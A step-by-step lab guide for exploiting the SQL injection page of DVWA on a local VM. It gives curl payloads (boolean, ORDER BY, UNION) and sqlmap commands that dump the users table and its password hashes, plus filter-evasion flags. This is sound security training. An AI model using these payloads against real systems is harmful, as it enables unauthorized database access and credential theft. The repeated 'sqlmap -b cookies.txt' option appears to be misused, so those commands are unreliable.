# DVWA SQL Injection (Terminal) — Copy‑and‑Paste Guide

**Purpose:** A step‑by‑step, copy‑pasteable guide you can upload to GitHub. Use the commands exactly as shown in your Kali/Ubuntu VM terminal to reproduce the environment, log in programmatically, set DVWA security to **low**, perform manual SQLi checks, and run **sqlmap** to enumerate and dump databases. The document includes troubleshooting and a reinstall procedure.

> **Important safety note:** Only run these commands against your own DVWA VM or an explicitly authorized lab. Do **not** attack third‑party systems.

---

## How to use this file
1. Save this file to your repository as `README.md` (or any filename).  
2. Open your VM terminal, copy lines from the code blocks and paste them **one command at a time**. Do not try to paste large multi‑line blocks as a single combined line unless the block is explicitly shown as a single line.

---

# Quick checklist (before you start)
- You have Apache + PHP + MariaDB (or MySQL) installed and running.  
- DVWA files are located in `/var/www/html/dvwa` (or `/var/www/html/DVWA` based on install). Adjust URLs if your folder name differs.  
- You have `sqlmap` installed. (Kali usually includes it.)

---

# 0. Preliminary — go to your home directory
```bash
cd ~
pwd
```

This guarantees cookie files are created in a writable place.

---

# 1. Programmatic login and save cookies (creates `cookies.txt`)
This makes the terminal have a logged‑in session for DVWA.

**Command (single line):**
```bash
curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
```

**Verify cookie file and `PHPSESSID`:**
```bash
ls -l cookies.txt
grep -i PHPSESSID cookies.txt || cat cookies.txt
```

You should see a line containing `PHPSESSID` and a long session string.

---

# 2. Set DVWA security to LOW for that session (use same cookie)
This makes DVWA vulnerable so you can practice SQLi.

**Command (single line):**
```bash
curl -s -b cookies.txt -c cookies.txt -d "security=low&seclev_submit=Submit" "http://127.0.0.1/dvwa/security.php" > /dev/null
```

**Confirm `security` cookie now exists:**
```bash
grep -i security cookies.txt || cat cookies.txt
```

Expect a cookie entry named `security` with value `low`.

---

# 3. Confirm the SQLi page is reachable for your session
**Command:**
```bash
curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
```

**Good result:** `HTTP/1.1 200 OK` (means the server accepts your session). If you still see `HTTP/1.1 302 Found` with `Location: ../../login.php`, then your terminal session is not authenticated — see Troubleshooting later.

---

# 4. Manual SQLi checks (learn what is happening)

## 4.1 Save the normal page
```bash
curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -o /tmp/sqli_normal.html
```

## 4.2 Save a simple boolean injection page
```bash
curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit" -o /tmp/sqli_inj.html
```

## 4.3 Compare the two (quick view)
```bash
echo "--- normal ---"; head -n 40 /tmp/sqli_normal.html
echo "--- injected ---"; head -n 40 /tmp/sqli_inj.html
```

If the injected page shows **more rows** or different content, manual SQLi works — you can proceed to automated enumeration. If identical, try the ORDER BY and UNION steps below.

---

# 5. Detect number of columns (ORDER BY loop)
Run this to find when `ORDER BY N` causes an error — the highest `N` without an error is the column count.

```bash
for i in {1..12}; do
  echo -n "ORDER BY $i: "
  curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%20ORDER%20BY%20$i--%20&Submit=Submit" \
    | grep -i "error" >/dev/null && echo "ERROR" || echo "no error"
done
```

If, for example, `ORDER BY 5` is `ERROR` and `ORDER BY 4` is `no error`, you have **4 columns**.

---

# 6. Manual UNION probe (example)
If you detected 2 columns, test this to display `version()` from MySQL:

```bash
# (change NULLs to match your number of columns)
curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20NULL,version()--%20&Submit=Submit" -o /tmp/union.html
head -n 200 /tmp/union.html
```

If `version()` appears, UNION injection worked.

---

# 7. Automated enumeration with sqlmap (recommended)
Use sqlmap to enumerate DBs, tables, and dump the users table. There are two main modes:
- **Using `cookies.txt`** (terminal session cookie)
- **Using explicit browser cookie header** (if `cookies.txt` is unreliable)

## 7.1 Basic sqlmap (use `cookies.txt`):
```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  -b cookies.txt -p id --batch --level=3 --risk=2 --dbs | tee sqlmap-dbs.txt
```

If it finds DBs (look for `dvwa`), then list tables and dump users:
```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  -b cookies.txt -p id --batch -D dvwa --tables | tee sqlmap-tables.txt

sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  -b cookies.txt -p id --batch -D dvwa -T users --dump | tee sqlmap-users.txt
```

## 7.2 If `cookies.txt` fails — use browser session cookie directly
In Firefox DevTools → Storage → Cookies, copy the `PHPSESSID` value (and `security` if present). Then run:
```bash
SESSION="paste_PHPSESSID_here"
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${SESSION}; security=low" -p id --batch --level=3 --risk=2 --dbs | tee sqlmap-dbs.txt
```

## 7.3 If sqlmap reports "not injectable" — try aggressive mode
```bash
SESSION=$(grep PHPSESSID cookies.txt | awk '{print $7}')
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${SESSION}; security=low" -p id --batch --level=5 --risk=3 --technique=BEU --random-agent --tamper=space2comment --dbs | tee sqlmap-aggr.txt
```

Notes: `--tamper=space2comment` rewrites spaces to `/**/` to bypass basic filters. `--random-agent` randomizes the User-Agent header.

---

# 8. Reading results
- `sqlmap-dbs.txt` will contain discovered databases (look for `dvwa`).
- `sqlmap-tables.txt` shows table names; look for `users`.
- `sqlmap-users.txt` will contain the dumped rows (usernames & password hashes).

**For your assignment**: copy the `users` table output into your report and explain steps and payloads used (examples are in this guide).

---

# 9. Troubleshooting (common problems & fixes)

## 9.1 `HTTP/1.1 302 Found -> Location: ../../login.php`
Meaning: your terminal session is not authenticated. Fix by re‑creating `cookies.txt` (Step 1) and setting `security=low` (Step 2). If that fails, use the **browser cookie** method (Step 7.2).

## 9.2 `security=impossible` keeps appearing
Possible causes:
- You are missing the `security=low` cookie for the session the terminal sends. Edit or overwrite `cookies.txt` and force `security=low` (example command below).

**Force security low by editing cookies file (safe for local lab):**
```bash
cp cookies.txt cookies.txt.bak
awk 'BEGIN{OFS="\t"} { if($6=="security") $7="low"; print }' cookies.txt > cookies.tmp && mv cookies.tmp cookies.txt
grep -i security cookies.txt
```

Or use the forced cookie header method:
```bash
SESSION=$(grep PHPSESSID cookies.txt | awk '{print $7}')
curl -s -I --cookie "PHPSESSID=${SESSION}; security=low" "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
```

## 9.3 DVWA setup/database missing
Open `http://127.0.0.1/dvwa/setup.php` in your browser and click **Create / Reset Database**. Or import the SQL via terminal:
```bash
sudo mysql -u root -p dvwa < /var/www/html/dvwa/dvwa/includes/dvwa_mysql.sql
# enter root mysql password or dvwa user credentials depending on your config
```

## 9.4 PHP session directory permissions (no persistence)
Check PHP session save path and permissions:
```bash
php -i | grep session.save_path -n
ls -ld /var/lib/php/sessions 2>/dev/null || ls -ld /tmp
```
If the session folder is not owned or writable by `www-data`, fix it:
```bash
sudo mkdir -p /var/lib/php/sessions
sudo chown -R www-data:www-data /var/lib/php/sessions
sudo chmod 1733 /var/lib/php/sessions
sudo systemctl restart apache2
```

## 9.5 Apache errors and logs
If something still fails, inspect logs for clues:
```bash
sudo tail -n 200 /var/log/apache2/error.log
sudo tail -n 200 /var/log/apache2/access.log
```

---

# 10. Full reinstall of a vulnerable DVWA snapshot (if you want to start fresh)
**Warning:** This removes the existing `/var/www/html/dvwa` directory. Only do this if you don’t need existing data.

```bash
sudo systemctl stop apache2
sudo rm -rf /var/www/html/dvwa
sudo apt update
sudo apt install -y git php-mbstring php-xml php-gd php-mysql mariadb-server mariadb-client libapache2-mod-php
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git dvwa
sudo chown -R www-data:www-data dvwa
cd dvwa/config
sudo cp config.inc.php.dist config.inc.php
# optionally edit DB user/pass in config.inc.php if you use custom creds
sudo chmod -R 755 /var/www/html/dvwa
sudo chmod -R 777 /var/www/html/dvwa/hackable/uploads
sudo systemctl restart apache2
sudo systemctl restart mariadb
# open http://127.0.0.1/dvwa/setup.php in the VM browser and click Create/Reset Database
```

After setup, log in via browser `admin/password`, set Security = Low, then continue with the `curl`/`sqlmap` steps above.

---

# 11. Extra sqlmap tips (useful flags)
- `--batch` — non-interactive
- `--level` / `--risk` — increase tests (higher = more checks slower)
- `--technique` — `B,E,U,T,S` select techniques; `BEU` is a good start
- `--tamper` — useful scripts: `space2comment`, `between`, `charencode` vs filters
- `--random-agent` — rotate user agent to avoid naive filters

---

# 12. What to paste back to get help quickly
If something fails, paste the exact output of one or more of these commands and someone (or you) can quickly diagnose:
```bash
sed -n '1,200p' cookies.txt
curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,20p'
sudo tail -n 80 /var/log/apache2/error.log
mysql -u dvwauser -p -D dvwa -e "SHOW TABLES;"   # enter dvwapass
```

---

# 13. Sample short workflow to copy and run (one sequence)
```bash
cd ~
# login and save cookies
curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
# set security low
curl -s -b cookies.txt -c cookies.txt -d "security=low&seclev_submit=Submit" "http://127.0.0.1/dvwa/security.php" > /dev/null
# sanity check
curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
# manual boolean test
curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit" -o /tmp/sqli_inj.html
# run sqlmap
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -b cookies.txt -p id --batch --level=3 --risk=2 --dbs | tee sqlmap-dbs.txt
```

---

# 14. Attribution and notes
This guide is tailored to DVWA (Damn Vulnerable Web App) running on a local VM. It consolidates manual curl techniques and sqlmap automation commonly used in web app security labs.

---

**End of guide.**


